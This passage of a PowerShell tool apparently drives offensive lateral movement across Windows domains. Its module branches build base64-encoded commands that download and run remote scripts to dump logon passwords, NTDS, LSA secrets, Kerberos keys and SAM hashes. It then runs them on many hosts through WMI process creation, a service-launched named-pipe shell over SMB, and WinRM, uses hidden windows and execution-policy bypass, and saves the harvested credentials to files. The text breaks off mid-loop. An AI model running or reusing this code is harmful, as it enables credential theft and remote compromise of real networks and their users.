# LogonPasswords
elseif ($Module -eq "LogonPasswords"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# NTDS
elseif ($Module -eq "NTDS"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# eKeys
elseif ($Module -eq "ekeys"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LSA
elseif ($Module -eq "LSA"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# SAM
elseif ($Module -eq "SAM"){
$b64 = "$LocalSAM"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Disks
elseif ($Module -eq "disks"){
$b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# LoggedOnUsers
elseif ($Module -eq "LoggedOnUsers"){
$b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# Sessions
elseif ($Module -eq "Sessions"){
$b64 = "Write-host; query user | Out-String"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# ConsoleHistory
elseif ($Module -eq "ConsoleHistory"){
$b64 = "$ConsoleHostHistory"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Files
elseif ($Module -eq "Files"){
$b64 = "$Files"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}



elseif ($Module -eq "" -and $Command -ne ""){
$base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
$Command = "powershell.exe -ep bypass -enc $base64Command"
}


################################################################################################################
################################# Logic to help keep output tidy and even ######################################
################################################################################################################

if ($Method -ne "Spray" -and !$IPAddress){
$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
}

elseif ($Method -ne "Spray" -and $IPAddress){
$NameLength = 16
$OSLength = 14
}

################################################################################################################
################################################ Function: WMI #################################################
################################################################################################################
Function Method-WMIexec {
param ($ComputerName)
Write-host
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList


$scriptBlock = {
    param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect"}


# Function to perform WMI operations
Function WMI {
    param (
        [string]$ComputerName,
        [string]$Command = "whoami",
        [string]$Class = "PMEClass",
        [switch]$LocalAuth,
        [string]$Username,
        [string]$Password
    )

    $WMIAccess = $null

    # Create PSCredential object if using local authentication
    if ($LocalAuth) {
        $LocalUsername = "$ComputerName\$Username"
        $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
    }

    # Check for local or non-local authentication
    if ($LocalAuth) {$WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $Cred } 
    else {$WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

    if (!$WMIAccess) { return "Access Denied"} 
    elseif ($Command -eq "") { return "Successful Connection PME" }

    function CreateScriptInstance {
        param ([string]$ComputerName)

        if ($LocalAuth) {
            if ($LocalAuth) {
                $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $Cred
                if ($classCheck -eq $null) {
                    $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                    $scope.Connect()

                    $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                    $newClass["__CLASS"] = "$Class"
                    $newClass.Qualifiers.Add("Static", $true)
                    $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
                    $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
                    $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                    $newClass.Put() | Out-Null
                }

                $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred
                $wmiInstance.GetType() | Out-Null
                $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
                $wmiInstance.Dispose()
                return $commandId
            }
        } else {
            $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
            if ($classCheck -eq $null) {
                $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
                $newClass["__CLASS"] = "$Class"
                $newClass.Qualifiers.Add("Static", $true)
                $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
                $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
                $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                $newClass.Put() | Out-Null
            }
            $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
            $wmiInstance.GetType() | Out-Null
            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
            $wmiInstance.Dispose()
            return $commandId
        }
    }

    # Function to retrieve script output
    function GetScriptOutput {
        param (
            [string]$ComputerName,
            [string]$CommandId
        )
        try {
            if ($LocalAuth) {
                $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $Cred
            } else {
                $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
            }
            $result = $wmiInstance.CommandOutput
            $wmiInstance.Dispose()
            return $result
        } catch {
            Write-Error $_.Exception.Message
        } finally {
            if ($wmiInstance) {
                $wmiInstance.Dispose()
            }
        }
    }

    # Function to execute a command remotely
    function ExecCommand {
        param (
            [string]$ComputerName,
            [string]$Command
        )
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        if ($LocalAuth) {
            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred
        } else {
            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        }
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                if ($LocalAuth) {
                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $Cred
                } else {
                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                }
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput -ComputerName $ComputerName -CommandId $scriptCommandId
            return $scriptOutput
        }
    }

    # Main script logic
    $commandString = $Command
    $scriptCommandId = CreateScriptInstance -ComputerName $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand -ComputerName $ComputerName -Command $encodedCommand

    # Clean up WMI class instance
    if ($LocalAuth) {
        $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2" -Credential $Cred
        Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $Cred | Out-Null
    } else {
        $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
        Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    }

    return $result
}

If ($LocalAuth){WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password}
else {WMI -ComputerName $ComputerName  -Command $Command}


}

# Create and invoke runspaces for each computer
# Filter non-candidate systems before wasting processing power on creating runspaces

foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }


        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }




# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            try {$result = $result.Trim()} catch {}

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
                         
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################## Function: SMB ################################################
################################################################################################################
Function Method-SMB{

Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param($ComputerName, $Command, $Timeout)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }   
    
$SMBCheck = $false
$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

if (!$SMBCheck) {
    return "Access Denied"
}

if ([string]::IsNullOrWhiteSpace($Command)) {
    return "Successful connection PME"
}


    
    function Enter-SMBSession {

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "45000"
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	Start-Sleep -Milliseconds 2000
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		return "Timed Out"

	} catch {
		Write-Output "unexpected error"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command 2>&1 | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
    return Enter-SMBSession -ComputerName $ComputerName -Command $Command




}





# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            try {$result = $result.Trim()} catch {}


            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!" -methodPrefix "SMB!"
                continue
            } 
            elseif ($result -eq "Unexpected Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                continue
            } 
            
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                continue
            } 
             
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                }
                 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################### Function: WinRM ################################################
################################################################################################################
Function Method-WinRM {
Write-host


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command, $Timeout, $Module)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }
      
try {
    # Leave these comments here because its a clusterfuck
    # Check if the module is "Amnesiac"
    if ($Module -eq "Amnesiac") {
        # Test the connection by invoking a simple echo command
        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
            echo "Successful Connection PME"
        } -ErrorAction Stop

        # If the test command succeeded, proceed with the actual command
        if ($result) {
            # Define a script block that will execute the command
            $AscriptBlock = {
                param($command)
                Invoke-Expression $command
            }

            # Execute the command as a background job and ignore the job object
            Invoke-Command -ComputerName $computerName -ScriptBlock $AscriptBlock -ArgumentList $Command -AsJob | Out-Null
            # Return a success message
            return "Successful Connection PME"
        } else {
            # If the test command failed, return an access denied message
            return "Access Denied"
        }
    } elseif ($Command -eq "") {
        # If the command is empty, execute a simple echo command
        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
            echo "Successful Connection PME"
        } -ErrorAction Stop

        # If the result is empty, ensure a success message is returned
        if (-not $result) {
            $result = "Successful Connection PME"
        }

        # Return the result
        return $result
    } elseif ($Command -ne "") {
        # If a command is provided, execute it
        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
            Invoke-Expression $Using:Command
        } -ErrorAction Stop

        # If the result is empty, ensure a success message is returned
        if (-not $result) {
            $result = "Successful Connection PME"
        }

        # Return the result
        return $result
    }
} catch {
    # Handle exceptions based on their message
    if ($_.Exception.Message -like "*Access is Denied*") {
        return "Access Denied"
    } elseif ($_.Exception.Message -like "*cannot be resolved*") {
        return "Unable to connect"
    } else {
        return "Unspecified Error"
    }
}



}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete


do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            }
             
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
